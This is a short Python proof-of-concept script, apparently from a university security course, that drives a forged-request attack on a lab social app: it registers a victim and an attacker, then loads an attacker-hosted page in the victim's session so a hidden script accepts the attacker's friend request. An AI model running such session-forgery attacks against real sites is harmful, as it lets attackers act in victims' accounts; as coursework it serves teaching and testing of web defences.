from requests import session, get
from sys import argv
from random import randint
from Common.Driver import runScript

SERVER = argv[1]
attackerSERVER = "http://web.tecnico.ulisboa.pt/ist190774/SSof/WsGFKpWmHjfjMWn0fS3f.html"

victimSession = session()
victimUsername = str(randint(2 ** 27, 2 ** 28))
victimPassword = str(randint(2 ** 27, 2 ** 28))
attackerSession = session()
attackerUsername = "Attacker"
attackerPassword = str(randint(2 ** 27, 2 ** 28))

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

data = {
    "username": victimUsername,
    "password": victimPassword
}
r = victimSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert victimUsername in r.text

data = {
    "username": attackerUsername,
    "password": attackerPassword
}
r = attackerSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert attackerUsername in r.text

data = {
    "username": victimUsername
}
r = attackerSession.post(SERVER + "/request_friend", data=data)

assert "Succesfully" in r.text
assert victimUsername in r.text

# The Victim Browser Executes the Malicious Script
# And Accept Attacker Friend Request Impersonating the Victim
runScript(SERVER, attackerSERVER, victimSession)

r = victimSession.get(SERVER + "/friends")

assert attackerUsername in r.text

print("Success!")
victimSession.close()
attackerSession.close()
